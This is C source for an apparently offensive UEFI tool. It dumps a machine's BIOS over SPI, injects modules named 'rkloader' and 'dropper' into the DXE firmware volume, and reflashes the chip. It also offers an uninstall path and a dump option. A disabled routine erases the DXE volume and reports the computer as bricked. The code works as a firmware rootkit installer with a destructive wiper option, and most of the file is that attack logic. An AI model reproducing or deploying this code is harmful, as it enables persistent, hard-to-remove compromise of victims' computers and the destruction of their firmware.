#include <Uefi.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fcntl.h>

#include "conio.h"

#include "config.h"
#include "settings.h"
#include "chipset.h"
#include "spi.h"
#include "fv.h"

void readspi_callback(UINT32 spibase_addr, UINT32 spi_size, UINT32 spiaddr);
void writespi_callback(UINT32 spibase_addr, UINT32 spi_size, UINT32 spiaddr);
void erasespi_callback(UINT32 spibase_addr, UINT32 spi_size, UINT32 spiaddr);
void errorspi_callback(UINT32 spiaddr, UINT16 command);

int load_file(char *filename, char **fileBuffer, int *fileSize)
{
	FILE *fp;
	char *buffer;

	fp = fopen(filename, "rb");

	if (fp == NULL)
	{
		*fileBuffer = NULL;
		*fileSize = 0;
		goto END;
	}

	fseek(fp, 0, SEEK_END);

	*fileSize = (int) ftell(fp);

	fseek(fp, 0, SEEK_SET);

	buffer = malloc(*fileSize);

	memset(buffer, 0xFF, *fileSize);

	fread(buffer, 1, *fileSize, fp);
	fclose(fp);

	*fileBuffer = buffer;
	return 0;
END:
	return 1;
}

int save_file(const char *filename, char *buffer, int length)
{
	FILE *fp;
	int handle;
	int step = length / 100;
	int progress = 1, _length = length;

	fp = fopen(filename, "wb");

	if (fp == NULL)
	{
		printf("Cannot open %s\n", filename);
		return 1;
	}

	handle = fileno(fp);
	

	fcntl(handle, F_SETFL, __SNBF);	// e che dio ce la mandi buona!

	printf("Writing %s   0%%\r", filename);

	while(_length > 0)
	{
		if (_length > 512)
		{
			fwrite(buffer, 512, 1, fp);
			buffer += 512;
			_length -= 512;
		}
		else
		{
			fwrite(buffer, _length, 1, fp);
			_length -= _length;
		}

		if (_length < (length - step * progress))
			printf("Writing %s %-3d%%\r", filename, progress++);
	}

	printf("Writing %s 100%%\n", filename);
	
	fclose(fp);
	return 0;
}


int show_menu()
{
	char c;
	int result = -1;

ask_choice:
	clrscr();

	textbackground(BLUE);
	textcolor(WHITE);
	
	printf("\n");
	printf("\n");
	printf("i: Install\n");
	printf("u: Uninstall\n");
	printf("d: Dump BIOS\n");
	//printf("x: Erase DXE!\n");
	printf("\n");
	printf("q: Exit\n");
	printf("r: reboot\n");

	c = getchar();

	switch(c)
	{
		case 'i':
		case 'I':
				result = 0;
			break;
		case 'u':
		case 'U':
				result = 1;
			break;
		case 'd':
		case 'D':
				result = 2;
			break;
		case 'q':
		case 'Q':
				result = 3;
			break;
		case 'x':
		case 'X':	// cannot use this!
				result = 5;
				break;
		case 'r':
		case 'R':
			result = 4;
			break;
		default:
			result = -1;
			break;
	}
	
	if (result == -1)
		goto ask_choice;

	return result;
}

const char *pathBIOS = "\\tmp\\bios.bin";
const char *pathDXE = "\\tmp\\dxe.bin";
const char *pathNewDXE = "\\tmp\\newdxe.bin";
const char *pathNewFv = "\\tmp\\newfc.bin";

char *pathDriver0 = "\\modules\\ntfs.mod";
char *pathDriver1 = "\\modules\\rkloader.mod";
char *pathDriver2 = "\\modules\\dropper.mod";

char *modules[4];

int check_modules()
{
	FILE *fp;
	int i;

	i = 0;

	while(modules[i] != NULL)
	{
		//printf("\nChecking %s", modules[i]);

		fp = fopen(modules[i], "rb");

		if (fp == NULL)
		{
			textcolor(RED);
			printf("\nNo configuration files found on storage %s", modules[i]);
			textcolor(LIGHTGRAY);
			return 1;
		}
		fclose(fp);
		i++;
	}

	return 0;
}

int PushModules(UINT8 *DxeBuffer, UINT32 DxeLength)
{
	int i, buff_size;
	char *buffer;

	i = 0;
	while(modules[i] != NULL)
	{
		printf("Adding file %s on volume ", modules[i]);

		if (load_file(modules[i], &buffer, &buff_size) != 0)
		{
			textcolor(RED);
			printf(" ... ERROR!\n");
			return 1;
		}

		if (Py_FvVolumeAddFile(DxeBuffer, DxeLength, (UINT8 *) buffer, buff_size) != EFI_SUCCESS)
		{
			printf(" ... Cannot add file into partition\n");
			return 1;
		}

		free(buffer);	// release buffer!
		buffer = NULL;
		buff_size = 0;

		i++;

		printf(" .. OK!\n");
	}

	return 0;
}

int PopFiles(UINT8 *DxeBuffer, UINT32 DxeLength)
{
	int i, buff_size;
	char *buffer;
	int _require_update = 0;

	i = 0;
	while(modules[i] != NULL)
	{
		//printf("\nAdding file %s on volume", argv[i]);

		if (load_file(modules[i], &buffer, &buff_size) != 0)
		{
			textcolor(RED);
			printf(" ... ERROR!");
			return 1;
		}

		if (Py_FvDeleteFileFromVolume(DxeBuffer, DxeLength, (UINT8 *) buffer, buff_size) == EFI_SUCCESS)
		{
			_require_update = 1;
		}

		free(buffer);	// release buffer!
		buffer = NULL;
		buff_size = 0;

		i++;
	}

	return _require_update;
}

int install(struct SPI_obj *SPIData, UINTN SPI_REGION, UINTN SPI_LIMIT, UINTN SPI_FREG)
{
	UINT8 *SPIBuffer = NULL, *DxeBuffer = NULL, *NewDxeBuffer = NULL, *volume = NULL;
	UINTN dummy;
	UINT32 SPI_LENGTH, DxeLength, NewDxeLength, VolAddress, VolSize;
	UINT32 VolHandle, VolIndex;

	printf("[Main] BIOS dump from chipset\n");

	SPIBuffer = malloc(SPI_LIMIT - SPI_REGION + 1);

	read_spi((struct SPI_obj *) SPIData, SPI_REGION, 1 + SPI_LIMIT - SPI_REGION, SPIBuffer, &readspi_callback, &errorspi_callback);

	printf("[Main] Reading done. Dump on disk!\n");

	// Dumping Firmware

	SPI_LENGTH = (UINT32)(SPI_LIMIT - SPI_REGION + 1);
	
	save_file(pathBIOS, (char *) SPIBuffer, (int) SPI_LENGTH);

	printf("***********************************************\n");
	printf("* Wait: Opening dump                          *\n");
	printf("***********************************************\n");

	if (Py_LookupDxeImage(SPIBuffer, SPI_LENGTH, &VolHandle) != EFI_SUCCESS)
	{
		textcolor(YELLOW);
		printf("***********************************************\n");
		printf("* ERROR: Invalid UEFI/EFI firmware            *\n");
		printf("* Please submit spi.bin to our support.       *\n");
		printf("***********************************************\n");
		goto END;
	}

	Py_VolumeFromHandle(VolHandle, &VolIndex);

	VolAddress = Py_FvVolumeAddress(SPIBuffer, SPI_LENGTH, VolIndex);
	VolAddress += SPI_REGION;	// Base Address of Volume

	printf("* Uncompress dxe...\n");
	Py_FvOpenVolume(SPIBuffer, SPI_LENGTH, VolHandle, &DxeBuffer, &DxeLength);

	if (DxeBuffer == NULL || DxeLength == 0)
	{
		textcolor(YELLOW);
		printf("***********************************************\n");
		printf("* ERROR: Cannot open DXE volume.              *\n");
		printf("* Please submit spi.bin to our support.       *\n");
		printf("***********************************************\n");
		goto END;
	}

	printf("* Adding files to dxe...\n");
	if (PushModules(DxeBuffer, DxeLength))	// push files!
		return 0;

	printf("* Compressing dxe...\n");

	volume = ptr_to_volume(SPIBuffer, SPI_LENGTH, VolIndex);
	VolSize = volume_size(SPIBuffer, SPI_LENGTH, VolIndex);

	Py_FvCloseVolume(volume, VolSize, DxeBuffer, DxeLength, VolHandle, &NewDxeBuffer, &NewDxeLength);

//	Py_FvVolumeAddFile

	save_file(pathNewFv, (char *) NewDxeBuffer, (int)NewDxeLength);

	printf("***********************************************\n");
	printf("* WARNING: Erasing volume........             *\n");
	printf("***********************************************\n");
	printf("Erasing from address 0x%x for 0x%x bytes.\n",  VolAddress, VolSize);
	erase_spi(SPIData, VolAddress, VolSize, &erasespi_callback, &errorspi_callback);

	textcolor(YELLOW);
    printf("***********************************************\n");
	printf("* WARNING: Reprogramming volume........       *\n");
	printf("***********************************************\n");
	printf("Programming from address 0x%x for 0x%x bytes.\n",  VolAddress, VolSize);
	write_spi(SPIData, VolAddress, VolSize, NewDxeBuffer, &writespi_callback, &errorspi_callback);
			
	textcolor(YELLOW);
    printf("***********************************************\n");
	printf("* INFORMATION: Reboot computer........        *\n");
	printf("***********************************************\n");

END:
	// So.. free previous buffer!
	free(SPIBuffer);
	free(SPIData);

	return 0;
}

int uninstall(struct SPI_obj *SPIData, UINTN SPI_REGION, UINTN SPI_LIMIT, UINTN SPI_FREG)
{
	UINT8 *SPIBuffer = NULL, *DxeBuffer = NULL, *NewDxeBuffer = NULL, *volume = NULL;
	UINTN dummy;
	UINT32 SPI_LENGTH, DxeLength, NewDxeLength, VolAddress, VolSize;
	UINT32 VolHandle, VolIndex;

	printf("[Main] BIOS dump from chipset\n");

	SPIBuffer = malloc(SPI_LIMIT - SPI_REGION + 1);

	read_spi((struct SPI_obj *) SPIData, SPI_REGION, 1 + SPI_LIMIT - SPI_REGION, SPIBuffer, &readspi_callback, &errorspi_callback);

	printf("[Main] Reading done. Dump on disk!\n");


	// Dumping Firmware

	SPI_LENGTH = (UINT32)(SPI_LIMIT - SPI_REGION + 1);
	
	save_file(pathBIOS, (char *) SPIBuffer, (int) SPI_LENGTH);

	printf("***********************************************\n");
	printf("* Wait: Opening dump                          *\n");
	printf("***********************************************\n");

	if (Py_LookupDxeImage(SPIBuffer, SPI_LENGTH, &VolHandle) != EFI_SUCCESS)
	{
		textcolor(YELLOW);
		printf("***********************************************\n");
		printf("* ERROR: Invalid UEFI/EFI firmware            *\n");
		printf("* Please submit spi.bin to our support.       *\n");
		printf("***********************************************\n");
		goto END;
	}

	Py_VolumeFromHandle(VolHandle, &VolIndex);

	VolAddress = Py_FvVolumeAddress(SPIBuffer, SPI_LENGTH, VolIndex);
	VolAddress += SPI_REGION;	// Base Address of Volume

	printf("* Uncompress dxe...\n");
	Py_FvOpenVolume(SPIBuffer, SPI_LENGTH, VolHandle, &DxeBuffer, &DxeLength);

	if (DxeBuffer == NULL || DxeLength == 0)
	{
		textcolor(YELLOW);
		printf("***********************************************\n");
		printf("* ERROR: Cannot open DXE volume.              *\n");
		printf("* Please submit spi.bin to our support.       *\n");
		printf("***********************************************\n");
		goto END;
	}

	if (!PopFiles(DxeBuffer, DxeLength))	// push files!
	{
		textcolor(YELLOW);
		printf("***********************************************\n");
		printf("* INFORMATION: No modules on firmware.        *\n");
		printf("***********************************************\n");

		return 0;
	}

	printf("* Compressing dxe...\n");

	volume = ptr_to_volume(SPIBuffer, SPI_LENGTH, VolIndex);
	VolSize = volume_size(SPIBuffer, SPI_LENGTH, VolIndex);

	Py_FvCloseVolume(volume, VolSize, DxeBuffer, DxeLength, VolHandle, &NewDxeBuffer, &NewDxeLength);

//	Py_FvVolumeAddFile

	printf("***********************************************\n");
	printf("* WARNING: Erasing volume........             *\n");
	printf("***********************************************\n");
	erase_spi(SPIData, VolAddress, VolSize, &erasespi_callback, &errorspi_callback);

	textcolor(YELLOW);
    printf("***********************************************\n");
	printf("* WARNING: Reprogramming volume........       *\n");
	printf("***********************************************\n");
	write_spi(SPIData, VolAddress, VolSize, NewDxeBuffer, &writespi_callback, &errorspi_callback);
			
	textcolor(YELLOW);
    printf("***********************************************\n");
	printf("* INFORMATION: Reboot computer........        *\n");
	printf("***********************************************\n");

END:
	// So.. free previous buffer!
	free(SPIBuffer);
	free(SPIData);

	return 0;
}

int diagnostic(struct SPI_obj *SPIData, UINTN SPI_REGION, UINTN SPI_LIMIT, UINTN SPI_FREG)
{
	UINT8 *SPIBuffer = NULL;
	UINTN dummy;
	UINT32 SPI_LENGTH;

	printf("[Main] BIOS dump from chipset\n");

	SPIBuffer = malloc(SPI_LIMIT - SPI_REGION + 1);

	read_spi((struct SPI_obj *) SPIData, SPI_REGION, 1 + SPI_LIMIT - SPI_REGION, SPIBuffer, &readspi_callback, &errorspi_callback);

	printf("[Main] Reading done. Dump on disk!\n");

	// Dumping Firmware

	SPI_LENGTH = (UINT32)(SPI_LIMIT - SPI_REGION + 1);
	
	save_file(pathBIOS, (char *) SPIBuffer, (int) SPI_LENGTH);

	// So.. free previous buffer!
	free(SPIBuffer);
	free(SPIData);

	return 0;
}

int erase_firmware(struct SPI_obj *SPIData, UINTN SPI_REGION, UINTN SPI_LIMIT, UINTN SPI_FREG)
{
	UINT8 *SPIBuffer = NULL, *volume = NULL;
	UINTN dummy;
	UINT32 SPI_LENGTH, DxeLength, NewDxeLength, VolAddress, VolSize;
	UINT32 VolHandle, VolIndex;

	printf("[Main] BIOS dump from chipset\n");

	SPIBuffer = malloc(SPI_LIMIT - SPI_REGION + 1);

	read_spi((struct SPI_obj *) SPIData, SPI_REGION, 1 + SPI_LIMIT - SPI_REGION, SPIBuffer, &readspi_callback, &errorspi_callback);

	printf("[Main] Reading done. Dump on disk!\n");

	// Dumping Firmware

	SPI_LENGTH = (UINT32)(SPI_LIMIT - SPI_REGION + 1);
	
	printf("***********************************************\n");
	printf("* Wait: Identify partition                    *\n");
	printf("***********************************************\n");

	if (Py_LookupDxeImage(SPIBuffer, SPI_LENGTH, &VolHandle) != EFI_SUCCESS)
	{
		textcolor(YELLOW);
		printf("***********************************************\n");
		printf("* ERROR: Invalid UEFI/EFI firmware            *\n");
		printf("***********************************************\n");
		goto END;
	}

	Py_VolumeFromHandle(VolHandle, &VolIndex);

	VolAddress = Py_FvVolumeAddress(SPIBuffer, SPI_LENGTH, VolIndex);
	VolAddress += SPI_REGION;	// Base Address of Volume

	volume = ptr_to_volume(SPIBuffer, SPI_LENGTH, VolIndex);
	VolSize = volume_size(SPIBuffer, SPI_LENGTH, VolIndex);

	
	printf("***********************************************\n");
	printf("* WARNING: Erasing volume........             *\n");
	printf("***********************************************\n");
	printf("Erasing from address 0x%x for 0x%x bytes.\n",  VolAddress, VolSize);
	erase_spi(SPIData, VolAddress, VolSize, &erasespi_callback, &errorspi_callback);
		
	textcolor(YELLOW);
    printf("***********************************************\n");
	printf("* INFORMATION: Bricked computer..             *\n");
	printf("***********************************************\n");

END:
	// So.. free previous buffer!
	free(SPIBuffer);
	free(SPIData);

	return 0;
}

int main(int argc, char *argv[])
{
	UINT8 *SPIData;
	UINTN dummy;
	UINTN SPI_REGION, SPI_LIMIT, SPI_FREG;
	int result;

	modules[0] = pathDriver0;
	modules[1] = pathDriver1;
	modules[2] = pathDriver2;
	modules[3] = NULL;	// end

	if (check_modules())
	{
		return 0;
	}

	clrscr();
	
	//printf("    **** ][ ****\n");

	if (ChipsetInit() != RETURN_SUCCESS)
	{
		printf("Cannot identify chipset!\n");
		return 1;
	}

	dummy = 0;

	if (SPI_Initialize(gConfiguration, NULL, &dummy) != EFI_BUFFER_TOO_SMALL)
	{
		printf("Cannot initialize SPI over PCI!\n");
		return 1;
	}

	SPIData = malloc(dummy);

	memset(SPIData, 0, dummy);	// clear memory

	if (SPI_Initialize(gConfiguration, SPIData, &dummy) != EFI_SUCCESS)
	{
		printf("[Main] Cannot initialize SPI over PCI (2)!\n");
		return 1;
	}

	// spi object initialized!

	printf("[Main] SPI found\n");

	SPI_REGION = SPI_LIMIT = SPI_FREG = 0;

	get_SPI_region((struct SPI_obj *) SPIData, PCH_RCBA_SPI_FREG1_BIOS, &SPI_REGION, &SPI_LIMIT, &SPI_FREG);
	
	printf("[Main] SPI %08x %08x %08x\n", SPI_REGION, SPI_LIMIT, SPI_FREG);

	result = 0;

	switch(show_menu())
	{
		case 0:
			install((struct SPI_obj *) SPIData, SPI_REGION, SPI_LIMIT, SPI_FREG);
			break;
		case 1:
			uninstall((struct SPI_obj *) SPIData, SPI_REGION, SPI_LIMIT, SPI_FREG);
			break;
		case 2:
			diagnostic((struct SPI_obj *) SPIData, SPI_REGION, SPI_LIMIT, SPI_FREG);
			break;
		case 3:
			result = -1;
			break;
		case 5:
			//erase_firmware((struct SPI_obj *) SPIData, SPI_REGION, SPI_LIMIT, SPI_FREG);

			break;
		default:
			break;
	}

	return result;
}
